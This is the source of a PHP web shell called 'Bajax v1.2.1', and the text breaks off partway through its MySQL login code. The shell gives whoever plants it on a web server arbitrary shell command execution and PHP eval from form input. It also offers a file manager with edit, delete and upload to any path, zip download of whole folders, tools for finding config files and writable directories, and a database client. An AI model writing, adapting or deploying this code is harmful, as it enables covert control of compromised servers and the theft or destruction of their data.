<?php
error_reporting(0);
session_start();
@ini_set("max_execution_time",0);
ob_start();
class Bajax
{
	private $con;
	private $password="05cf794b99880f35747bcfbaa2937583";
	private $name="Bajax v1.2.1";
	private $datasec = array(); 
	private $ctrl_dir = array(); 
	private $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	private $old_offset = 0;
	private $find;
	private $ip;
	private $pdo;
	private $favicon="iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA21JREFUeNqMVUsotGEUPmNmMBjMYAolhBIi15VQlI0oImShbFz2f3IpysbSksKCXLKQBVlIuRXKdeE25JZbjIzLuJ//nNM/Xxj/7z91mvf7vvd93vM+53neUQGA2dPT0+Ds7Aw2mw3e399BpVIBh4eHBzw+PoLVaoWvERAQAIgIT09P8uzm5gZnZ2fXGhqbMjIy9GVlZZCSkgJqtVpAePLw8LDk4uKibMLv7IuLioogMTERMjMz5VtfXx80NjZquZQrSqOrqyvk5ORAS0sLhIeHy8LU1FRYX18XQCcnJ6U6BuZNb25uoKurS4pob2/nTxb4A4j29PPzw+npaeTY3t7GkpIS/FvU19cjVYgf1l85AHL6+PjgzMyMLNrZ2cG1tTUHsP7+fiwuLkaq/mdATm9vb5yfn8eDgwMMDg7G5eVlBWxjYwOJb7y8vMSlpaX/A+Q0Go1I3CBxhAaDARcWFvDu7g6JaxwfH0dSBE5MTHwClKZ4eXkZAwMDwcXFRSRisViEdA6WBZMeFhYGOp1OxhcXFxAZGQm8hhszNDQE8fHxsLq6apHW3d7eysKQkBBIS0sTjbEG29rapOsvLy9QUVEhG25tbUFVVRVkZ2dDb2+vSCc9PR3o+PD29gaKFljQrC+uUK/XQ2xsLHR2dsom/v7+Ut3h4aFIiisymUxA3MLk5CQUFBSAVqsVHDXlL3KKjpog+jo5OYHT01NxjdlshuPjY6l4c3NT3rNeqetwdHQk4FNTU0Dyko13d3dtirDhm6ipqYGsrCzIzc0F4hkGBwchKChIsRz/UsehtLTUvsSigX8EHyM6OlrGTH5DQwOMjo4C6RQ+UvU1vpVNQkIC0hGxsrIS8/PzlfcxMTFINCianJub+1mH7u7u4pDy8nIknvD19RWrq6s/gRKHAjg7O/sz4MDAAHZ3d8s4Li5OqaapqUmZExUVhdRAXFlZ+TdgXV0djo2NIfEnz0lJSZ88zM6xz42IiMCOjg5Hp3CX+YJl0ukGEQns7+8Lwb6+vpCXl6cQTseXjicnJ0unyZ7Q2toKxKVyfVlpAY6MjCA5Bs/Pz7Gnpwdra2sxNDTUoVmFhYXiaQJDsife39/j3t4eNjc3IznJyhWa6Q6Uv4CHhwepgpoCGo1GPGt/x8GXLPv3+flZ0h48l21JnF7/FmAA22tszHkUqewAAAAASUVORK5CYII=";
	//file manager goes here
	function header() {
		// favicon
		if(isset($_GET['fav'])){
		$data=base64_decode($this->favicon);
		header("Content-type:image/png");
		header("Cache-control:public");
		echo $data;
		exit;
		}
		$r='';
		$r.="<!DOCTYPE html><head><title>$this->name</title>";
		$r.='<link rel="SHORTCUT ICON" type="image/png" href="'.$_SERVER['SCRIPT_NAME'].'?fav" />';
		$r.="<style type='text/css'>
		body {
		background:#000;
		font-family:Tahoma,Verdana;
		color:#fff;
		font-size:12px;
		}
		#wrapper {
		margin:10px auto;
		padding:20px;
		background:#000;
		border-top:1px solid #00A600;
		-moz-box-shadow:inset 0 0 5px #00c6ff;
		-webkit-box-shadow: inset 0 0 5px #00c6ff;
		box-shadow: 0 0 5px #00A600;
		border-radius:5px;
		}
		#head {
		border-bottom:thin solid #00A600;
		padding:7px;
		line-height:1.3em;
		}
		#menu{border-bottom: 1px solid #00A600; padding: 5px; text-align: center; margin-bottom:15px;}
		#menu a{padding: 7px 10px; color: #fff; font-size: 13px; font-weight:bold;font-family: arial; text-decoration: none; }
		#menu a:hover{color: #00A600; text-decoration:none;-moz-border-radius:4px;-webkit-border-radius:4px;}
		#center{
		border:1px solid #00A600;
		font-size:12px;
		padding:10px;
		text-align:center;
		}
		#center table {
		width:100%;
		font-size:12px;
		margin:0 auto;
		}
		#center td {
		border-bottom:1px solid #00A600;
		padding:5px;
		margin-bottom:10px;
		}
		#center #input {
		border:1px solid #00A600;
		width:400px;
		border:1px solid #00A600;
		background:#000;
		color:#fff;padding:3px;
		margin-left:10px;
		}
		#center #input:hover {
		background-color:#2e2e2e;
		}
		#isi #but:hover {
		color:#ffffff;
		background:#00A600;
		}
		#center #cmd {
		width:700px;
		border:1px solid #00A600;
		background:#000;
		color:#fff;padding:3px;
		}
		#center #cmd:hover {
		background:#2e2e2e;
		}
		#center #pos {
		border-bottom:1px solid #00A600;
		text-align:center;
		padding:5px;
		}
		#pos textarea {
		height:100px;
		width:500px;
		margin:5px 0 5px 0;
		resize:none;
		}
		#isi {
		border:1px solid #00A600;
		margin:10px auto;
		padding:10px;
		color:#fff;
		padding-bottom:15px;
		line-height:1.5em;
		}
		#see {
		border:1px solid #00A600;
		margin:10px auto;
		padding:10px;
		padding-right:15px;
		color:#fff;
		padding-bottom:15px;
		line-height:1.5em;
		overflow-x:scroll;
		}
		#isi textarea {
		line-height:1.5em;
		border:none;
		background:#000;
		width:100%;
		height:300px;
		margin-bottom:10px;
		font-size:12px;
		color:#fff;
		border-bottom:1px solid #00A600;
		resize:none;
		}
		#isi input:hover {
		color:#00A600;
		}
		#footer {
		font-size:12px;
		text-align:center;
		}
		.xpltab {
		font-size:11px;
		color:#fff;
		font-family:Tahoma,Verdana,Arial;
		border-right:thin solid #00A600;
		}
		.xpltab th {
		background-color: #00A600;
		padding:4px;
		opacity:50%;
		border:thin solid #000;
		border-left:thin solid #00A600;
		border-right:thin solid #000;
		}
		.xpltab th:hover {
		color:#fff;
		}
		.xpltab td {
		border-bottom:thin solid #00A600;
		border-left:thin solid #00A600;
		padding:5px;
		}
		a:link,a:active,a:visited {
		text-decoration:none;
		color:#00A600;
		}
		#box {
		border:1px solid #00A600;
		width:200px;
		border:1px solid #00A600;
		-moz-border-radius:3px;
		-webkit-border-radius:3px;
		background:#000;
		color:#fff;padding:3px;
		margin-left:7px;
		margin-right:7px;
		}
		.tengah {
		margin:0 auto;
		display:block;
		font-size:14px;
		}
		hr {
		line-color:#00A600;
		}
		#but:hover {
		background-color: #00A600;
		color:#fff;
			}
		#but {
		height:25px;
		background:#222;
		color:#fff;
		padding:3px;
		width:70px;
		border-radius:4px;
		-moz-border-radius:4px;
		-webkit-border-radius:4px;
		border:none;
		margin-left:7px;
		}
		#but:active {
		position:relative;
		top:1px;
			}
		#col {
		margin-left:7px;
		float:left;
		line-height:2.4em;
		}
		#val{
		margin-left:20px;
		float-right;
		margin-bottom:7px;
		}
		#sqlbox {
		border:1px solid #00A600;
		width:1000px;
		border:1px solid #00A600;
		background:#000;
		color:#fff;padding:3px;
		margin-left:7px;
		margin-right:7px;
		}
		.gede {
		font-size:20px;
		margin:0 auto;
		color:#00A600;
		}
		</style></head><body><div id='wrapper'><div id='head'>
		".php_uname()."<br />".$_SERVER['SERVER_SOFTWARE']."<br />".get_current_user()."<br />Server Ip : ".gethostbyname($_SERVER['HTTP_HOST'])."<br />Your IP : ".$_SERVER['REMOTE_ADDR']."<br />".$this->drive()."</div>";
		return $r;
	}
	function menu ()
	{
		$r='';
		$menu=array("[ Files ]"=>"?act=file&dir=".$this->dir()."", "[ Mysql ]"=>"?act=mysql&dir=".$this->dir()."","Info.Ser"=>"?act=ser&dir=".$this->dir()."", "Encoder"=>"?act=encode&dir=".$this->dir()."", "Writable Dir"=>"?act=write&dir=".$this->dir()."","BD Scanner"=>"?act=bds&dir=".$this->dir()."","Config Finder"=>"?act=loc&dir=".$this->dir(),"Search File"=>"?act=search&dir=".$this->dir(),"Logout"=>"?act=out");
		$r.="<div id='menu'>";
		foreach($menu as $val=>$key){
		$r.="<a href='$key'>$val</a>";
		}
		$r.= "</div>";
		return $r;
	}
	function logo() {
		$r='';
		$r.="<pre><center>
___________		
		\______   \_____      |__|____  ___  ___
		 |    |  _/\__  \     |  \__  \ \  \/  /
		 |    |   \ / __ \_   |  |/ __ \_>    < 
		 |______  /(____  /\__|  (____  /__/\_ \
		        \/      \/\______|    \/      \/
		</pre></center>";
		return $r;
	}
	function footer()
	{
		$r='';
		$r.="</div></div><div id='footer'>Copy Left Bajax ".date("Y")."</div>";
		return $r;
	}
	function xpl() {
		$r='';
		if ($_POST['aksi']=='download' && $_POST['pilih']>0) {
			$this->get_selected($_POST['pilih']);
		} elseif ($_POST['aksi'] =='delete' && $_POST['pilih']>0) {
			$this->del_selected($_POST['pilih']);
		}
		$dname=array();
		$fname=array();
		if ($dh=opendir($this->dir())) {
			while(false !==($name=readdir($dh))) {
				if($name !='.') {
				(is_dir($name))?$dname[]=$name:$fname[]=$name;
			}    
			}
			closedir($dh);
		}
		sort($dname);
		sort($fname);
		$no=0;
		$r.="<center>Current Location : <br />".$this->current('file');
		$r.="</center><div id='isi'><table border=0 style='width:100%' cellspacing=0 class='xpltab'><tr><th style='width:50%;'>Name</th><th style='width:70px;'>Size</th><th style='width:100px;'>Owner : Group</th><th style='width:80px;'>Permission</th><th style='width:50px;'>Writable</th><th style='100px;'>Modified</th><th>Action</th>";
		foreach( $dname as $folder )
			{   
				$own=function_exists('posix_getpwuid')?posix_getpwuid(fileowner($this->dir().$folder)):"0";
				$group=function_exists('posix_getpwuid')?posix_getpwuid(filegroup($this->dir().$folder)):"0";
				$owner=$own['name'].":".$group['name'];
				$write=is_writable($this->dir().$folder)?"Yes":"No";
			$r.='<form method="post" action="" name="aksi_sel">';

				if($folder =='..')
				{
					$pwd=$this->up($this->dir());
					$r .="<tr><td><a href='?act=file&amp;dir=$pwd'>$folder </a></td><td>LINK</td><td>$owner</td><td>".substr(sprintf('%o', fileperms($this->dir().$folder)),-3)."</td><td>$write</td><td>".date("d-M-Y H:i",filemtime($this->dir().$folder))."</td></tr>";
			  
				} else {
					$d=$this->dir();
				$r .="<tr><td><a href='?act=file&amp;dir=$d$folder".DIRECTORY_SEPARATOR."'>$folder /</a></td><td>".$this->getSize($this->foldersize($d.$folder))."</td><td>$owner</td><td>".(is_readable($folder)?substr(sprintf('%o', fileperms($d.$folder.DIRECTORY_SEPARATOR)),-3):'Forbidden')."</td><td>$write</td><td>".date("d-M-Y H:i",filemtime($d.$folder.DIRECTORY_SEPARATOR))."</td><td><a href='?act=ren&dir=$d&file=$folder'>Ren</a> | <a href='?act=file&act3=del&dir=$d&file=$d$folder'>Del</a> | <a href='?act=downfolder&file=".$d.$folder.DIRECTORY_SEPARATOR."'>Download</a><input id=\"pilih$no\" name=\"pilih[]\" value=\"".$d.$folder.DIRECTORY_SEPARATOR."\" type=\"checkbox\" ></td></tr>";
			  }
			  $no++;
			}
		foreach($fname as $file)
		{
			$own=function_exists('posix_getpwuid')?posix_getpwuid(fileowner($this->dir().$file)):"0";
			$group=function_exists('posix_getpwuid')?posix_getpwuid(filegroup($this->dir().$file)):"0";
			$owner=$own['name'].":".$group['name'];
			$write=is_writable($this->dir().$file)?"Yes":"No";
			$d=$this->dir();
			$r .="<tr><td><a href='?act=lihat&dir=$d&file=$d$file'>$file</a></td><td>".$this->getSize(filesize($file))."</td><td>$owner</td><td>".(is_readable($file)?substr(sprintf('%o', fileperms($file)),-3):'forbidden')."</td><td>$write</td><td>".date("d-M-Y H:i",filemtime($file))."</td><td><a href='?act=edit&dir=$d&file=$file'>Edit</a> | <a href='?act=ren&dir=$d&file=$file'>Ren</a> | <a href='?act=file&act2=del&dir=$d&file=".$this->replace($d.$file)."'>Del</a> | <a href='?act=downfile&file=".$this->replace($d.$file)."'>Download</a><input id=\"pilih$no\" name=\"pilih[]\" value=\"$file\" type=\"checkbox\" ></td></tr>";
			$no++;
		}
		$r.= "</table><script> 
		  function ls_setcheckboxall(status) 
		  { 
		   var id = 1; 
		   var num = 43; 
		   while (id <= num) 
		   { 
		    document.getElementById('pilih'+id).checked = status; 
		    id++; 
		   } 
		  } 
		  function ls_reverse_all() 
		  { 
		   var id = 1; 
		   var num = 43; 
		   while (id <= num) 
		   { 
		    document.getElementById('pilih'+id).checked = !document.getElementById('pilih'+id).checked; 
		    id++; 
		   } 
		  } 
		  </script>";
		$r.='<br><center><input id="but" type="button" onclick="ls_setcheckboxall(true);" value="Select all">&nbsp;&nbsp;<input id="but" type="button" onclick="ls_setcheckboxall(false);" value="Unselect"> <select style="background:#222;color:#fff" name="aksi" ><option>On selected</option><option value="delete">Delete</option><option value="download">Download</option></select> <input type="submit" id="but" name="kirim" value="confirm"></center></form></div>';
		return $r;
	}
	function up($d) {
		$s=DIRECTORY_SEPARATOR;
		$d=explode($s,$d);
		array_pop($d);
		array_pop($d);
		$r=implode($d,$s).DIRECTORY_SEPARATOR;
		return $r;
	}
	function current($f) {
		$d=explode(DIRECTORY_SEPARATOR, $this->dir());
		$s='';
		$r='';
		for ($i=0; $i <count($d); $i++) { 
			$s.=$d[$i].DIRECTORY_SEPARATOR;
			($i==count($d)-1?$r.="<a href='?act=$f&dir=".$s."'>$d[$i]</a>":$r.="<a href='?act=$f&dir=".$s."'>$d[$i]".DIRECTORY_SEPARATOR."</a>");
		}
		return $r;
	}
	function getsize($s) {
		if(!$s) return 0;
		if($s>=1073741824) return(round($s/1073741824,2)." GB");
		elseif($s>=1048576) return(round($s/1048576,2)." MB");
		elseif($s>=1024) return(round($s/1024,2)." KB");
		else return($s." B");
	}
	function foldersize($path) {
		$total_size = 0;
		$files = scandir($path);
		$cleanPath = rtrim($path, '/'). '/';
		foreach($files as $t) {
		    if ($t<>"." && $t<>"..") {
		        $currentFile = $cleanPath . $t;
		        if (is_dir($currentFile)) {
		            $size = $this->foldersize($currentFile);
		            $total_size += $size;
		        }
		        else {
		            $size = filesize($currentFile);
		            $total_size += $size;
		        }
		    }   
		}
		return $total_size;
	}
	function converter()
	{
		$r='';
		$r.="<div id='isi'>";
		$opt=array("MD5"=>"md5","Hex"=>"hexa","Base64 Encoder"=>"64en","Base64 Decoder"=>"64de","SHA1"=>"sha1","URL Encoder"=>"urlen","URL Decoder"=>"urlde");
		if(isset($_POST['submit'])&&!empty($_POST['convert']))
		{
			$val=$this->convert($_POST['isi']);
			$r.="<textarea >$val</textarea>";
		}
		$isi="<center><form method='post' action='?act=encode'><textarea style='width:50%;height:100px;border:1px solid #00A600;' name='convert' ></textarea><br /><select name='isi' id='box'>";
			foreach ($opt as $k=>$v) {
				$isi.="<option value=$v>".$k."</option>";
			}
			$r.=$isi."<input type='submit' name='submit' style='color:#fff' id='but' value='Convert'></form></center></div>";
			return $r;
	}
	function convert($isi)
	{
		$i=$_POST['convert'];
		switch ($isi) {
			case 'md5':$c=md5($i);return $c;break;
			case 'hexa':$c=bin2hex($i);return $c;break;
			case '64en':$c=base64_encode($i);return $c;break;
			case '64de':$c=base64_decode($i);return $c;break;
			case 'sha1':$c=sha1($i);return $c;break;
			case 'urlen':$c=urlencode($i);return $c;break;
			case 'urlde':$c=urldecode($i);return $c;break;
		}
	}
	function infoser()
	{
		$r="<div id='isi'><table style='font-size:12px;'>";
		$r.="<tr><td>Disable Function </td><td>: ".(ini_get('disable_functions')?ini_get('disable_functions'):"All Function Enable")."</td></tr>";;
		$r.="<tr><td>Safe Mode </td><td>: ".(ini_get('safe_mode')?"On":"Off")."</td></tr>";
		$r.="<tr><td>Open Base Dir </td><td>: ".ini_get('openbase_dir')."</td></tr>";
		$r.="<tr><td>Php version </td><td>: ".phpversion()."</td></tr>";
		$r.="<tr><td>Register Global </td><td>: ".(ini_get('register_global')?'Enable':'Disable')."</td></tr>";
		$r.="<tr><td>Curl </td><td>: ".(extension_loaded('curl')?'Enable':'Disable')."</td></tr>";
		$r.="<tr><td>Database Mysql </td><td>: ".(function_exists('mysql_connect')?'On':'Off')."</td></tr>";
		$r.="<tr><td>Magic Quotes </td><td>: ".(ini_get('Magic_Quotes')?'On':'Off')."</td></tr>";
		$r.="<tr><td>Remote Include </td><td>: ".(ini_get('allow_url_include')?'Enable':'Disable')."</td></tr>";
		$r.="<tr><td>Disk Free Space </td><td>: ".$this->getSize(diskfreespace($this->dir()))."</td></tr>";
		$r.="<tr><td>Total Disk Space </td><td>: ".$this->getSize(disk_total_space($this->dir()))."</td></tr>";
		$r.="</table></div>";
		return $r;
	}
	function replace($dir) {
		return str_replace('\\','/', $dir);
	}
	function center()
	{
	$r='';	
	$r.='<div id="center"><div id="pos"><form method="post" action="?act=cmd&dir='.$this->dir().'">Command <input type="hidden" name="action" value="command"><input type="text" id="cmd" name="cmd" value=""><input type="submit" id="but" name="submit" value="Execute"></form></div><br /><div id="pos"><form method="post" action="?act=eval&dir='.$this->dir().'">PHP Eval <br /><input type="hidden" name="action" value="eval"><textarea placeholder="//don\'t include php tag" id="cmd" name="eval"></textarea><br /><input type="submit" id="but" name="submit" value="Execute"></form></div><form method="post" action="?act=file&dir='.$this->dir().'"><table><tr><td>Create Directory : <input type="hidden" name="action" value="mkdir"><input type="text" id="input" placeholder="mydir" name="dir"><input type="submit" id="but" name="submit" value="Create"></form></td><td><form method="post" action="?act=file&dir='.$this->dir().'">Create File : <input type="hidden" name="action" value="createfile"><input type="text" placeholder="sample.txt" id="input" name="file" value=""><input type="submit" id="but" name="submit" value="Create"></form></td></tr></table>
	<div id="pos"><form method="post" action="?act=file&dir='.$this->dir().'" enctype="multipart/form-data"><input type="hidden" name="action" value="uploader">Upload File <p /> Save To <input type="text" id="input" name="tujuan" value="'.$this->dir().'"><br /><input type="file" name="berkas"><input type="submit" name="submit id="but" value="upload"></form></div></div>';
	return $r;
	}
	function drive() {
		$r='';
		foreach (range("A", "Z") as $val) {
		if(is_dir($val.":".DIRECTORY_SEPARATOR))
		{
			
			$ad=$val.":".DIRECTORY_SEPARATOR;
			$r=$r.="<a href='?act=file&dir=$ad'>$val:".DIRECTORY_SEPARATOR."</a> ";
		}
			}
		return $r;
	}
	function dir() {
		if(isset($_GET['dir'])) {
		 $dir =$_GET['dir'];
			if(is_dir($dir)){
			chdir($dir);
			return $dir;
			}	
	 	}
	 	else {
		return getcwd().DIRECTORY_SEPARATOR;
		}
	}
	function remdir() {
		if(is_writable($_REQUEST['file']))
		{
		$dir=$_GET['file'];
		$this->deleteDirectory($dir); 
		}
		else{return  $this->alert("Permission Denied !");}
	 }
	 function remfile()
	 {
		$file=$_GET['file'];
		if(is_file($file)){
		unlink($file);
		}else{ return $this->alert("Permission Denied");}
	 }
	 function editfile($file)
	 {
		if(!empty($_POST['rename']))
		{
			rename($_POST['file'],$_POST['rename']);
		}
		$fp=fopen($_POST['rename'],'w');
		if(!$fp)return 0;
		fwrite($fp, stripslashes($_POST['isi']));
		fclose($fp);return 1;

	 }
	 //rename file to new name
	 function rename($file)
	 {
		if(!empty($_POST['rename']))
		{
			if(rename($_POST['file'],$_POST['rename']));
			return 1;return 0;
		}
	 }
	 function alert($text) {
		$r="<script>alert('$text');</script>";
		return $r;
	}
	function deleteDirectory($dir) {
		if (!file_exists($dir)) return true;
		if (!is_dir($dir) || is_link($dir)) return unlink($dir);
		foreach (scandir($dir) as $item) {
		if ($item == '.' || $item == '..') continue;
		if (!$this->deleteDirectory($dir . "/" . $item)) {
		chmod($dir . "/" . $item, 0777);
		if (!$this->deleteDirectory($dir . "/" . $item)) return false;
		};}return rmdir($dir);
	}
	function createfile() {
		if(!empty($_POST['file'])) {
			$fp=fopen($this->replace($this->dir.$_POST['file']),"w");
			if($fp)
			{
				fclose($fp);
				$r= $this->alert("file Created");
			}
		}
		
		return $r;
	}
	function mkdir()
	{
		if(!empty($_POST['dir']))
		{
			if(mkdir($this->replace($this->dir()).$_POST['dir']))
			return true;else return "Permission Denied";
		}
	}
	function upload()
	{
		$r='';
		if(!empty($_FILES['berkas']))
		{
			$dest=$this->replace($_POST['tujuan']);
			$name=$dest.$_FILES['berkas']['name'];
			if(move_uploaded_file($_FILES['berkas']['tmp_name'],$name))
			return true;else $r.= $this->alert("failed");
		}
		return $r;
	}
	function seval($c) {
		ob_start();
		eval($c.";");
		$h=ob_get_contents();
		ob_end_clean();
		return $h;
	}
	function phpeval() {
		$r='';
		$r.='<div id="isi">';
		if(isset($_POST['submit'])&&!empty($_POST['eval']))
		{
			$r.=htmlspecialchars($this->seval($_POST['eval']));
		}
		else $r.=header("location:?act=file&dir=".$this->dir());
		$r.='</div>';
		return $r;
	}
	function execution($r) {
		if(function_exists('system'))
		{
			ob_start();
			system($r);
			$s=ob_get_contents();
			ob_end_clean();
			return $s;
		}
		elseif(function_exists('passthru'))
		{
			ob_start();
			passthru($r);
			$s=ob_get_contents();
			ob_clean();
			return $s;
		}
		elseif(function_exists('exec'))
		{
			$s='';
			exec($r,$h);
			foreach ($h as $hasil) {
				$s.=$hasil;
			}
			return $s;
		}
		elseif(function_exists('shell_exec'))
		{
			$s=shell_exec($r);
			return $s;
		}
		return "All function Disable";
	}
	function command() {
		$r='';
		$r.='<div id="isi">';
		if(!empty($_POST['cmd']))
		{
		$r.="<pre>".$this->execution($_POST['cmd'])."</pre>";
		$r.="</div>";
		}
		else $r.=header("location:?act=file&dir=".$this->dir());
		return $r;
	}
	function del_selected($files) {
	 	$r='';
	 	foreach ($files as $file) {
	 		if (is_dir($file)) {
	 			if (is_writable($file)) {
	 				$this->deleteDirectory($file);
	 			} else {
	 				$r.=$this->alert('permission denied');
	 			}
	 		} elseif(is_file($file)) {
	 			if (is_writable($file)) {
	 				unlink($file);
	 			} else {
	 				$r.=$this->alert('permission denied');
	 			}
	 		}
	 	}
	 	return $r;
	}
	function add_dir($name) {
		$name = str_replace("\\", "/", $name);
		$fr = "\x50\x4b\x03\x04";
		$fr .= "\x0a\x00";
		$fr .= "\x00\x00";
		$fr .= "\x00\x00";
		$fr .= "\x00\x00\x00\x00";
		$fr .= pack("V",0);
		$fr .= pack("V",0);
		$fr .= pack("V",0);
		$fr .= pack("v", strlen($name) ); 
		$fr .= pack("v", 0 );
		$fr .= $name;
		$fr .= pack("V",$crc); 
		$fr .= pack("V",$c_len); 
		$fr .= pack("V",$unc_len);
		$this -> datasec[] = $fr;
		$new_offset = strlen(implode("", $this->datasec));
		$cdrec = "\x50\x4b\x01\x02";
		$cdrec .="\x00\x00"; 
		$cdrec .="\x0a\x00"; 
		$cdrec .="\x00\x00"; 
		$cdrec .="\x00\x00"; 
		$cdrec .="\x00\x00\x00\x00"; 
		$cdrec .= pack("V",0); 
		$cdrec .= pack("V",0); 
		$cdrec .= pack("V",0); 
		$cdrec .= pack("v", strlen($name) );
		$cdrec .= pack("v", 0 );
		$cdrec .= pack("v", 0 ); 
		$cdrec .= pack("v", 0 ); 
		$cdrec .= pack("v", 0 ); 
		$ext = "\x00\x00\x10\x00";
		$ext = "\xff\xff\xff\xff";
		$cdrec .= pack("V", 16 );
		$cdrec .= pack("V", $this -> old_offset );
		$this -> old_offset = $new_offset;
		$cdrec .= $name;
		$this -> ctrl_dir[] = $cdrec;
		}
		function add_file($data, $name)
		{
		$name = str_replace("\\", "/", $name);
		$fr = "\x50\x4b\x03\x04";
		$fr .= "\x14\x00";
		$fr .= "\x00\x00";
		$fr .= "\x08\x00"; 
		$fr .= "\x00\x00\x00\x00";
		$unc_len = strlen($data);
		$crc = crc32($data);
		$zdata = gzcompress($data);
		$zdata = substr( substr($zdata, 0, strlen($zdata) - 4), 2);
		$c_len = strlen($zdata);
		$fr .= pack("V",$crc);
		$fr .= pack("V",$c_len);
		$fr .= pack("V",$unc_len);
		$fr .= pack("v", strlen($name) );
		$fr .= pack("v", 0 );
		$fr .= $name;
		$fr .= $zdata;
		$fr .= pack("V",$crc);
		$fr .= pack("V",$c_len); 
		$fr .= pack("V",$unc_len); 
		$this -> datasec[] = $fr;
		$new_offset = strlen(implode("", $this->datasec));
		$cdrec = "\x50\x4b\x01\x02";
		$cdrec .="\x00\x00";
		$cdrec .="\x14\x00"; 
		$cdrec .="\x00\x00";
		$cdrec .="\x08\x00";
		$cdrec .="\x00\x00\x00\x00"; 
		$cdrec .= pack("V",$crc); 
		$cdrec .= pack("V",$c_len); 
		$cdrec .= pack("V",$unc_len); 
		$cdrec .= pack("v", strlen($name) );
		$cdrec .= pack("v", 0 ); 
		$cdrec .= pack("v", 0 ); 
		$cdrec .= pack("v", 0 ); 
		$cdrec .= pack("v", 0 ); 
		$cdrec .= pack("V", 32 ); 
		$cdrec .= pack("V", $this -> old_offset );
		$this -> old_offset = $new_offset;
		$cdrec .= $name;
		$this -> ctrl_dir[] = $cdrec;
		}
		function file() { 
		$data = implode("", $this -> datasec);
		$ctrldir = implode("", $this -> ctrl_dir);
		return
		$data.
		$ctrldir.
		$this -> eof_ctrl_dir.
		pack("v", sizeof($this -> ctrl_dir)).
		pack("v", sizeof($this -> ctrl_dir)). 
		pack("V", strlen($ctrldir)). 
		pack("V", strlen($data)). 
		"\x00\x00";
	}
	function get_files_from_folder($directory, $put_into) {
		$sp=DIRECTORY_SEPARATOR;
		if ($handle = opendir($directory)) {
		while (false !== ($file = readdir($handle))) {
				if (is_file($directory.$file)) {
				$fileContents = file_get_contents($directory.$file);
				$this->add_file($fileContents, $put_into.$file);
											}
			 	elseif ($file != '.' && $file != '..' && is_dir($directory.$file))
			 	{
		 			$this->add_dir($put_into.$file.$sp);
					$this->get_files_from_folder($directory.$file.$sp, $put_into.$file.$sp);
				}
													}
											}
		closedir($handle);
	}
	function get_selected_file($files, $put_into) {
		$sp=DIRECTORY_SEPARATOR;
		foreach ($files as $file) {
			if (is_file($file)) {
				$fileContents = file_get_contents($this->dir().$file);
				$this->add_file($fileContents, $put_into.$file);
			}
			elseif (is_dir($file)) {
				$fd=basename($file).DIRECTORY_SEPARATOR;
				if ($handle = opendir($file)) {
				while (false !== ($val = readdir($handle))) {
						if (is_file($file.$val)) {
						$fileContents = file_get_contents($file.$val);
						$this->add_file($fileContents, $put_into.$fd.$val);
													}
					 	elseif ($val != '.' && $val != '..' && is_dir($file.$val))
					 	{
					 			$this->add_dir($put_into.$fd.$val.$sp);
								$this->get_files_from_folder($file.$val.$sp, $put_into.$fd.$val.$sp);
						}
															}
													}
						closedir($handle);
			}
		}	
	}
	function get_selected($file) {
		$this->get_selected_file($file, '');
		header("Content-Disposition: attachment; filename=" .$this->cs(basename($this->dir()))."-".".zip");   
		header("Content-Type: application/download");
		header("Content-Length: " . strlen($this -> file()));
		flush();
		echo $this -> file(); 
		exit();
	}
	function downloadfile($f)
	{
		$fl=file_get_contents($f);
			header("Content-type:application/octet-stream");
			header("Content-length:".strlen($fl));
			header("Content-Disposition:attachment;filename=".$this->cs(basename($f)));
			echo $fl;
			exit;
	}
	function downloadfolder($fd) {
		$this->get_files_from_folder($fd,'');
		header("Content-Disposition: attachment; filename=" .$this->cs(basename($fd))."-".".zip");   
		header("Content-Type: application/download");
		header("Content-Length: " . strlen($this -> file()));
		flush();
		echo $this -> file(); 
		exit();
	}

	function cs($t) {
		return str_replace(" ","_",$t);
	}
	function lihat($file) {
		$r=''; 
		$r.="<table align=center cellpadding=5 style='width:100%;font-size:12px;'><tr><td >Action</td>
		<td ><a href='?act=edit&dir=".$this->dir()."&file=$file'>Edit</a> &nbsp;|&nbsp;<a href='?act=down&file=".$this->replace($file)."'>Download</a>
		|&nbsp; <a href='?act=file&act2=del&file=".$this->replace($file)."'>Del</a></td></tr><table>";
		$r.="<div id='see'>";
		$file = wordwrap(file_get_contents($file),"240","\n");
		$li= highlight_string($file,true);
		$old = array("0000BB","000000","FF8000","DD0000", "007700");
		$new = array("4C83AF","888888", "87DF45", "EEEEEE" , "FF8000");
		$r.= str_replace($old,$new, $li);
		$r.="</div>";	
		return $r;
	}
	function edit($file) {
		$d=$this->dir();
		$fp = fopen($file,'r');
		if (!$fp)
		return false;
		$r = '';
		$r .= '<div id="isi"><form action="?act=file&dir='.$d.'&file='.$file.'" method="post"><input type="hidden" name="action" value="editfile">'.'<input type="hidden" name="file" value="'.$file.'"><tr>';
		$r .= '<textarea name="isi">'.(htmlspecialchars(fread($fp, filesize($file)))).'</textarea><br />';
		$r .= '<span style="color:#fff;margin-right:5px;text-align:center">Rename : </span><input type="text" name="rename" value="'.$file.'" style="width:800px;border:1px solid #00A600;-moz-border-radius:3px;-webkit-border-radius:3px;background:#000;color:#fff;padding:3px;"></span> <br /><input type="submit" id="but" value="Save" /></td></tr>';
		$r .= '</form></div>';
		fclose($fp);
		return $r;
	}
	function ren($file) {
		$d=$this->dir();
		$r='';
		$r.="<div id='isi'><form action='?act=file&dir=".$d."' method='post'>";
		$r.='<input type="hidden" name="action" value="renamed">';
		$r.='<center><input type="text" name="file" value="'.$file.'" style="width:400px;border:1px solid #00A600;-moz-border-radius:3px;-webkit-border-radius:3px;background:#000;color:#fff;padding:3px;"> To <input type="text" name="rename" style="width:400px;border:1px solid #00A600;-moz-border-radius:3px;-webkit-border-radius:3px;background:#000;color:#fff;padding:3px;"></center><br /><input type="submit" id="but" value="Rename"></form></div>';
		return $r;
	}
	function login() {
		if(!isset($_SESSION['login'])&&!isset($_POST['masuk']))
		{
			$r='';
			$r.= '<div id="center"><form method="post" action="?act=mysql">Host : <input id="box" type="text" name="host" value="localhost">Username :<input type="text" name="user" id="box" value="root">Password <input type="text" id="box" name="pass"><input type="number" id="box" value="3306" name="port"><input type="submit" value="login" name="masuk" id="but"></div></form>';
			return $r;
		} 
		elseif(!isset($_SESSION['login'])&&isset($_POST['masuk']))
		{
			extract($_POST);
			$this->pdo=$this->pdo_con($host,$port,$user,$pass);
			if (strpos($this->pdo,"error")===false) {
				$_SESSION['host']=$_POST['host'];
				$_SESSION['port']=$_POST['port'];
				$_SESSION['user']=$_POST['user'];
